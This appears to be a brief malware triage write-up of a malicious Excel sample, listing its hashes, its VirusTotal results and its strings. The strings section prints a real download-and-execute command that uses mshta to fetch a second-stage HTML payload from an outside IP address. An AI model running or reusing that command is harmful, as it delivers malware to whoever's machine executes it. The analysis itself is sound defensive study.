# Analysis of lemon-mockingbird-north-alanine

asparagus-potato-london-march is a sample I downloaded from MalwareBazaar that was uploaded by [@Cryptolaemus1](https://twitter.com/Cryptolaemus1/), a link to the sample is below. The bulk of this analysis is based on techniques I have learned from [@HuskyHacksMK](https://twitter.com/HuskyHacksMK)'s Practical Malware Analysis & Triage course.

Sample source: [https://bazaar.abuse.ch/sample/c49da30a5ef994b4388c65f8fd295e33766011b1b5a2221db9753490408f62c7/](https://bazaar.abuse.ch/sample/c49da30a5ef994b4388c65f8fd295e33766011b1b5a2221db9753490408f62c7/)

## Static Analysis xlsx file

### File Hashes
I pulled the below hashes using hashcalc.

- MD5: db00ce44029164d0695bafc91fa67413
- SHA1: a7c0195d74d5be9c44638957c704eb76ef749c17
- SHA256: c49da30a5ef994b4388c65f8fd295e33766011b1b5a2221db9753490408f62c7

### VirusTotal
I was able to find a hit when searching the file hash in VT. There is some good information, interestingly only 8/60 vendors flag the file as mailicious. 

VirusTotal - [https://www.virustotal.com/gui/file/c49da30a5ef994b4388c65f8fd295e33766011b1b5a2221db9753490408f62c7](https://www.virustotal.com/gui/file/c49da30a5ef994b4388c65f8fd295e33766011b1b5a2221db9753490408f62c7)

### Strings
I used strings to pull all strings from the sample. One string really stood out and it looked very useful.

cmd /c set kiki=mshta http://91.240.118.172/mm/nn/se.html & echo %kiki% | cmdB

From here I went out on a limb and guessed this was a second stage and used any.run to pull a copy the html file safely. The any.run analysis where you can download a copy of he.html is here: [https://app.any.run/tasks/b756c3c0-d524-4c6c-95dc-d472c632a26d/](https://app.any.run/tasks/b756c3c0-d524-4c6c-95dc-d472c632a26d/)
